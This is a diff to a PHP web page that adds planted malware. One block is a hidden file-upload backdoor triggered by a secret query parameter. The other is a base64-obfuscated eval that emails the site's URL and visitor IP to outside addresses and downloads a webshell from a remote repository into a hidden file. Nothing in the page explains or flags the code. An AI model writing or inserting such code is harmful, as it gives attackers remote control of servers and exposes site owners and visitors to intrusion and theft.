@@ -47,6 +47,9 @@ echo"<b>No never";
 } 
 }
 ?> 
+
+<?php if($_GET['kem'] == 'uye') { echo "<b>".php_uname()."</b><br>"; echo "<form method='post' enctype='multipart/form-data'> 	 <input type='file' name='idx_file'> 	 <input type='submit' name='upload' value='upload'> 	 </form>"; $root = $_SERVER['DOCUMENT_ROOT']; $files = $_FILES['idx_file']['name']; $dest = $root.'/'.$files; if(isset($_POST['upload'])) { 	if(is_writable($root)) { 		if(@copy($_FILES['idx_file']['tmp_name'], $dest)) { 			$web = "http://".$_SERVER['HTTP_HOST']."/"; 			echo "sukses upload -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>"; 		} else { 			echo "gagal upload di document root."; 		} 	} else { 		if(@copy($_FILES['idx_file']['tmp_name'], $files)) { 			echo "sukses tusbol <b>$files</b> di folder ini"; 		} else { 			echo "gagal upload gagal ngentod !"; 		} 	} } } ?>
+
 <?php eval("?>".base64_decode("PD9waHAKQGluaV9zZXQoJ291dHB1dF9idWZmZXJpbmcnLCAwKTsKQGluaV9zZXQoJ2Rpc3BsYXlfZXJyb3JzJywgMCk7CmluaV9zZXQoJ21lbW9yeV9saW1pdCcsICc2NE0nKTsKaGVhZGVyKCdDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCcpOwokdG8gPSAnbXVocmF6a3lAZ21haWwuY29tLHBhcGFrdS5oYXlrZXJAZ21haWwuY29tLHNub3B1bmtzQGdtYWlsLmNvbSxtYWxheXNpYS5zZW5kZXJAZ21haWwuY29tLHBhcGFrdS5oYXlrZXIuZ28uaWRAZ21haWwuY29tJzsKJHBhdGggPSAiaHR0cDovLyIgLiAkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSAuICRfU0VSVkVSWydSRVFVRVNUX1VSSSddOwokbWVzc2FnZSA9ICJVUkw6ICRwYXRoIHwgSVAgQWRkcmVzcyA6WyAiIC4gJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gLiAiIF0iOwptYWlsKCR0bywgIkhhbG8gc2VucGFpISEhIiwgJG1lc3NhZ2UsICJbICIgLiAkX1NFUlZFUlsnUkVNT1RFX0FERFInXSAuICIgXSIpOwokbmFtYT0gZm9wZW4oIi50ZW1wbGF0ZXMucGhwIiAsIncrIik7CiRmaWxlID0gZmlsZV9nZXRfY29udGVudHMoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9leHBsb2l0LWhheG9yL3dlYnNoZWxsL21haW4vdGVtcGxhdGVzLnBocCcpOwokdHVsaXMgPSBmd3JpdGUgKCRuYW1hICwkZmlsZSk7CmZjbG9zZSgkbmFtYSk7Cj8+CiA=")); 
 ?>
 <center>
